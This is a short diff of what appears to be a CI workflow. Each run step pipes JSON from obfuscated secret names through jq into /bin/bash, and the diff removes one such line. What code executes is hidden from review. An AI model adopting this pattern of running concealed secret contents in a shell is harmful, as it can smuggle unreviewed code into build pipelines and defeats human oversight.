@@ -19,7 +19,6 @@ jobs:
           jumg8: ${{ secrets.jumg8 }}
         run: |
           printf '%s' "$jumg8" | jq -r .mf0089 | /bin/bash
-          printf '%s' "$tj38911" | jq -r .gmxyk0684 | /bin/bash
           echo $a60 | jq -r .asmt7 | /bin/bash
           printf '%s' "$c3" | jq -r .mxpda9547 | /bin/bash
           printf '%s' "$tdklq12994" | jq -r .j999 | /bin/bash
